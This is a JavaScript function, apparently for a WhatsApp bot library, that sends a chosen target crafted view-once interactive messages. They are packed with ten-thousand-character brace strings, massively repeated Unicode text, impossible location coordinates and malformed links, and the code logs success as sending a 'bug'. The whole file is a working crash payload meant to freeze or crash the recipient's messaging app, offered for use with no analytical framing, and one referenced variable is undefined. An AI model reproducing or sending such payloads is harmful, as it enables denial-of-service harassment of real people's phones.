async function VerloadBetaXxV2(target) {
 try {
  const space = "{".repeat(10000);

  const messagePayload = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: "VaxzyNotWhyy👀" },
          carouselMessage: {
            cards: cardsCrL,
            messageVersion: 1
            }
          }
        }
      }
    };
    
    const msg1 = generateWAMessageFromContent(target, messagePayload, {});

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [target],
    });
 
  const cards = [];
  const header = {
     videoMessage: {
       url: "https://mmg.whatsapp.net/v/t62.7161-24/21602184_2832961610425267_5849197637611598520_n.enc?ccb=11-4&oh=01_Q5Aa1wGka8VubJ__PC7eG6QnM2drUGuJv4_eFHNTZM7JysUEYA&oe=688CAD10&_nc_sid=5e03e0&mms3=true",
       mimetype: "video/mp4",
       fileSha256: "/pV21pNhkihyDh9p3Hq5wt7yhm8936pnjQqKre9lKpY=",
       fileLength: 3714175,
       seconds: 19,
       mediaKey: "LQ4w55EW8uoSwW/K7ejT0X++UhZIvP8pqrFkO7B/e50=",
       height: 576,
       width: 768,
       fileEncSha256: "BKuE23WWqS72GgIoJHmTGefyqUADW2hdeIlUBa15Oh4=",
       directPath: "/v/t62.7161-24/21602184_2832961610425267_5849197637611598520_n.enc?ccb=11-4&oh=01_Q5Aa1wGka8VubJ__PC7eG6QnM2drUGuJv4_eFHNTZM7JysUEYA&oe=688CAD10&_nc_sid=5e03e0",
       mediaKeyTimestamp: "1751466051",
       jpegThumbnail: "",
       contextInfo: {},
       streamingSidecar: "ypvxlTyuR3uzb1giNyNVUaHeJ40v9lL2IjwfM8njf+m2lvqWGcKb6L6IRiH6TiajAWpnj2z4ZsC6klWL6l2NkB65g8U+qXMyjADFSGOuG9LBI/jmx7h9vlpXjSgxZOLVy29HBS2vhjj8V1IglDR47GrAz0UZqcDuotGa/vJmSg5lKMpxxJqzvJth0h4spVX2pcH2aIVZnWkaHh2a+7BukY6hXN1A/or+VvhZyauto6anYMWAcnACcWP9dyBKYa1B7Ss7Vnu86uqUbQmyyNgePCipB9sundP9iq4RHBiR1RxFfrv990U+hYUPE0kbBtD1zfK9x+gmf1I9Cav0sP64xnWQ8TrhalUjTE2mVFfQqn8ZkY4IKwOpOgWzacImLK6j0Pj78jyibNShmDBlmG61QOMKfwVW4ZDw3M7kI1/1TJ3uKBXYzLlAs36BowfErSIrgEbU+OSA1g2Ay4qwH+k5mjkOLVnW3dshIjCdxsHUTTLQpQGnBrh+sARmOWL8UHjJOKCh/7lQZqx3Vv7ZOt13ry44AR2aRPEO7VkYpX4oOWhKyjJIgHpZXPddrZLL3s/yGVecfpP9F80HfuB5ieery0Ai0klbruXlB9JDrd2w2477587Djifcsqqdqwurc6DTvWaEaTZTCsHMAyuQCOLIoTY0fWvotA7oIW/eVYb8LwdJzjzVbswVl4XoWkc+nJBKJFcQ7PE/kRKe6aWyqARaY/XxPUmLrEWPrqLbn1yY8a6yICH2dmq+3Sf5"
    }, 
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "Vaxzy" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "VaxzyIsHere🤣\\>",
          contextInfo: {
            mentionedJid: ["13135550202@s.whatsapp.net"],
            externalAdReply: {
              title: "{ VaxzyIsHere🤣 }",
              body: "",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://nekopoi/care",
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "VaxzyIsHere😴\\>"
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              isGroupMention: true, 
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550202@s.whatsapp.net"
              },
              stanzaId: "Vaxzy" + "-Id" + Math.floor(Math.random() * 99999),
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550202@s.whatsapp.net"], // trigger
              externalAdReply: {
                title: "VaxzyAnonymous",
                body: "",
                thumbnailUrl: "https://nekopoi/care",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://Vaxzy.{{{{{{{{{.id/kontol?exambling=Vaxzy",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });

  const messageBetaXx = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "VaxzyIsHere៚",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "VaxzyIsHere៚".repeat(10000),
                address: "ោ៝".repeat(10000),
              },
            },
            body: { 
              text: `VaxzyIsHere៚${"꧀".repeat(2500)}.com - _ #`
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: Array(6).fill().map(() => ({
                name: Math.random() > 0.5 ? "mpm" : "single_select",
                buttonParamsJson: ""
              }))
            },
          },
        },
      },
    };

    await sock.relayMessage(target, messageBetaXx, {
      participant: { jid: target },
    });
    
    console.log(`Sukses send bug To : ${target}`);
  } catch (err) {
      console.log(err);
    }
  }